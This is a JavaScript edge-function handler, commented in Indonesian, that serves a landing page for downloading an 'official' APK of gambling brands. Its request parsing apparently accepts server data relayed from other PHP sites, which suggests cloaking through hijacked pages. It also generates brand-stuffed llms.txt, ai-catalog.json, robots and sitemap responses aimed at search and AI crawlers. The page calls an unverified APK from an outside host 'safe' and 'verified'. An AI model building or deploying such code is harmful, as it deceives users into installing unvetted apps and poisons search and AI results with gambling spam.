// --- 1. FUNGSI PENGAMAN & SANITASI ---
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function sanitizeText(str) {
  if (!str) return '';
  return str
    .replace(/[^a-zA-Z0-9\s]/g, ' ')
    .replace(/\s+/g, ' ')
    .trim()
    .toUpperCase();
}

// --- 2. PENGEKSTRAK DATA SERIALISASI PHP ---
function extractPHPSerializedValue(serializedStr, key) {
  if (!serializedStr) return '';
  const regex = new RegExp(`s:\\d+:"${key}";(?:s:\\d+:"([^"]*)?"|i:(\\d+);|b:(0|1);)`, 'i');
  const match = serializedStr.match(regex);
  if (match) {
    return match[1] !== undefined ? match[1] : (match[2] !== undefined ? match[2] : match[3]);
  }
  return '';
}

function generateCRC32Like(str) {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash |= 0;
  }
  return Math.abs(hash).toString(16);
}

// --- 3. GENERATOR METADATA AI (TERJEMAHAN DARI PHP) ---
function handleAiMetadata(requestPath, primaryBrandName, baseHost) {
  if (!primaryBrandName) {
    primaryBrandName = 'Portal Layanan Digital';
  }

  // Bersihkan base_host
  if (!/^https?:\/\//i.test(baseHost)) {
    baseHost = "https://" + baseHost.replace(/^\/+/, '');
  }
  baseHost = baseHost.replace(/\/+$/, '');

  const cleanBrand = primaryBrandName.toLowerCase().replace(/[^a-z0-9]/g, '') || 'portalbrand';
  const hostOnly = baseHost.replace(/^https?:\/\//i, '');

  // 1. Handle llms.txt
  if (requestPath.includes("llms.txt")) {
    let output = `# ${primaryBrandName}\n\n`;
    output += `> Portal resmi dan pusat layanan digital terintegrasi untuk ${primaryBrandName}.\n\n`;
    
    output += `## Tentang Layanan\n`;
    output += `${primaryBrandName} adalah platform digital yang menyediakan akses cepat, aman, dan terstruktur ke berbagai layanan unggulan serta informasi produk terlengkap.\n\n`;

    output += `## Tautan Utama & Navigasi\n`;
    output += `- [Beranda](${baseHost}/): Halaman utama portal layanan.\n`;
    output += `- [Katalog Produk & Layanan](${baseHost}/katalog): Daftar lengkap layanan yang tersedia.\n`;
    output += `- [Pusat Bantuan & FAQ](${baseHost}/faq): Informasi tanya jawab dan panduan penggunaan.\n`;
    output += `- [Hubungi Kami](${baseHost}/kontak): Layanan dukungan pelanggan dan komunikasi resmi.\n\n`;

    output += `## Kebijakan & Informasi Legal\n`;
    output += `- [Kebijakan Privasi](${baseHost}/privacy-policy): Ketentuan perlindungan data pengguna.\n`;
    output += `- [Syarat & Ketentuan](${baseHost}/terms-of-service): Aturan penggunaan layanan platform.\n`;
    output += `- [Disclaimer](${baseHost}/disclaimer): Batasan tanggung jawab informasi situs.\n`;

    return { content: output, contentType: "text/plain; charset=utf-8" };
  }

  // 2. Handle ai-catalog.json
  if (requestPath.includes("ai-catalog.json")) {
    const jsonData = {
      specVersion: "1.0",
      host: {
        displayName: primaryBrandName,
        identifier: "did:web:" + hostOnly,
        documentationUrl: `${baseHost}/llms.txt`
      },
      entries: [
        {
          identifier: `urn:air:${cleanBrand}:catalog:main`,
          type: "application/ai-catalog+json",
          displayName: "Katalog Utama " + primaryBrandName,
          url: `${baseHost}/katalog`,
          description: "Katalog resmi dan informasi layanan komprehensif dari " + primaryBrandName + ".",
          representativeQueries: [
            primaryBrandName,
            "situs resmi " + primaryBrandName,
            "katalog " + primaryBrandName,
            "layanan " + primaryBrandName
          ]
        },
        {
          identifier: `urn:air:${cleanBrand}:catalog:support`,
          type: "application/ai-catalog+json",
          displayName: "Pusat Bantuan " + primaryBrandName,
          url: `${baseHost}/faq`,
          description: "Informasi bantuan, tanya jawab, dan dukungan pelanggan.",
          representativeQueries: [
            "bantuan " + primaryBrandName,
            "kontak " + primaryBrandName
          ]
        }
      ]
    };

    return { content: JSON.stringify(jsonData, null, 2), contentType: "application/json; charset=utf-8" };
  }

  return null;
}

export async function onRequest(context) {
  const { request } = context;
  const url = new URL(request.url);

  let requestURI = url.pathname;
  let queryString = url.search.replace('?', '');
  let httpHost = 'spin8vip.top';
  let rawPostData = {};

  // 1. Tangkap request POST dari Server 1 jika ada
  if (request.method === 'POST') {
    try {
      const contentType = request.headers.get('content-type') || '';
      if (contentType.includes('application/x-www-form-urlencoded')) {
        const formData = await request.formData();
        rawPostData = Object.fromEntries(formData);
      } else if (contentType.includes('application/json')) {
        rawPostData = await request.json();
      } else {
        const bodyText = await request.text();
        rawPostData = Object.fromEntries(new URLSearchParams(bodyText));
      }

      if (rawPostData.x) {
        const serializedData = rawPostData.x;
        const uriFromPost = extractPHPSerializedValue(serializedData, 'REQUEST_URI');
        const queryFromPost = extractPHPSerializedValue(serializedData, 'QUERY_STRING');
        let hostFromPost = extractPHPSerializedValue(serializedData, 'HTTP_HOST') || extractPHPSerializedValue(serializedData, 'SERVER_NAME');

        if (uriFromPost) requestURI = uriFromPost;
        if (queryFromPost) queryString = queryFromPost;
        if (hostFromPost) httpHost = hostFromPost;
      }
    } catch (e) {}
  }

  if (!httpHost) {
    httpHost = 'spin8vip.top';
  }

  // 2. PARSING PATH & MENGABAIKAN FILE .PHP (DIJALANKAN LEBIH AWAL)
  let cleanPath = requestURI.replace(/^\/+/, '');
  if (cleanPath.includes('.php')) {
    const phpParts = cleanPath.split('.php');
    cleanPath = phpParts[phpParts.length - 1].replace(/^\/+/, '');
  }

  let brandQuery = '';
  const segments = cleanPath.split('/').filter(Boolean);
  
  // Jika path berisi llms.txt atau ai-catalog.json tapi ada brand di depannya (misal: /aby.php/asia200/llms.txt)
  if (segments.length > 1 && (segments[segments.length - 1] === 'llms.txt' || segments[segments.length - 1] === 'ai-catalog.json')) {
    brandQuery = segments[0]; // Ambil brand di segmen pertama
  } else if (segments.length > 0 && segments[0] !== 'llms.txt' && segments[0] !== 'ai-catalog.json') {
    brandQuery = segments[0];
  } else if (queryString) {
    brandQuery = queryString.replace(/^download\//i, '');
  } else {
    brandQuery = 'asia200'; // Fallback default brand Anda jika diakses mentah
  }

  const cleanBrandName = sanitizeText(brandQuery);
  const finalBrandTitle = cleanBrandName || 'ASIA200';

  const fullCheck = `${requestURI} ${queryString}`.toLowerCase();

  // 3. CEK APAKAH REQUEST MEMINTA LLMS.TXT ATAU AI-CATALOG.JSON
  const aiResponse = handleAiMetadata(fullCheck, finalBrandTitle, `https://${httpHost}`);
  if (aiResponse) {
    return new Response(aiResponse.content, {
      headers: { "Content-Type": aiResponse.contentType }
    });
  }

  // 4. HANDLE ROBOTS.TXT
  if (fullCheck.includes('robots.txt')) {
    const robotsOutput = `User-agent: *\nDisallow:\nSitemap: https://${httpHost}/sitemap-wp.xml`;
    return new Response(robotsOutput, {
      headers: { "Content-Type": "text/plain; charset=utf-8" }
    });
  }

  // 5. HANDLE SITEMAP
  if (fullCheck.includes('pingsitemap') || fullCheck.includes('sitemap-wp.xml')) {
    const sitemapOutput = `<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n  <url>\n    <loc>https://${httpHost}/</loc>\n    <changefreq>daily</changefreq>\n    <priority>1.0</priority>\n  </url>\n</urlset>`;
    return new Response(sitemapOutput, {
      headers: { "Content-Type": "text/xml; charset=utf-8" }
    });
  }

  // 6. RENDER HALAMAN UTAMA APK UNDUH
  const uniqueHash = generateCRC32Like(brandQuery);
  const customTitle = escapeHtml(`Situs Resmi Pendaftaran & Login ${finalBrandTitle} Terpercaya`);
  const customDesc = escapeHtml(`Link alternatif resmi ${finalBrandTitle} versi terbaru. Mainkan game gacor dan unduh aplikasinya dengan aman dan cepat.`);
  const downloadLink = `https://download.store-files.com/apk/${uniqueHash}/${encodeURIComponent(brandQuery)}.apk`;

  const htmlTemplate = `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${customTitle}</title>
  <meta name="description" content="${customDesc}">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 40px 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }
    .card { background: #1e293b; border: 1px solid #334155; border-radius: 16px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3); max-width: 440px; width: 100%; padding: 35px 25px; text-align: center; }
    .logo-badge { display: inline-block; background: #3b82f6; color: #fff; font-size: 12px; font-weight: bold; padding: 6px 14px; border-radius: 20px; margin-bottom: 20px; letter-spacing: 1px; text-transform: uppercase; }
    h1 { font-size: 20px; color: #fff; margin-bottom: 12px; line-height: 1.4; }
    p { font-size: 14px; color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
    .btn-download { display: block; background: #22c55e; color: #fff; text-align: center; padding: 15px 20px; border-radius: 10px; font-weight: bold; text-decoration: none; font-size: 16px; box-shadow: 0 4px 14px rgba(34, 197, 94, 0.4); transition: background 0.2s; }
    .btn-download:hover { background: #16a34a; }
    .footer-note { font-size: 12px; color: #64748b; margin-top: 20px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo-badge">Official APK</div>
    <h1>${customTitle}</h1>
    <p>${customDesc}</p>
    <a href="${downloadLink}" class="btn-download">DOWNLOAD APK RESMI</a>
    <div class="footer-note">Aman, Cepat, & Terverifikasi</div>
  </div>
</body>
</html>`;

  return new Response(htmlTemplate, {
    headers: { 
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "public, max-age=600"
    }
  });
}
